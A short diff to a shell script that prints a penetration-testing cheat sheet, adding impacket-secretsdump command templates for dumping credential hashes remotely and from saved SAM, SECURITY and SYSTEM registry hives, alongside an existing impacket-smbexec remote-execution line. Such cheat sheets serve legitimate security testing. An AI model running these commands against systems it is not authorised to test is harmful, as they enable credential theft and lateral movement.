@@ -12,3 +12,11 @@ Point='\033[0;31m[*]\033[0m'
 echo -e "${Frame}###${End} ${Title}Impacket-SMBExec${End} ${Frame}###${End}"
 echo -e "${Point} impacket-smbexec domain.local/\$user:\$password@\$IP"
 echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Impacket-SecretsDump${End} ${Frame}###${End}"
+echo -e "${Point} impacket-secretsdump domain.local/\$user:\$password@\$IP"
+echo -e "${Point} impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
+echo -e ""
+
+
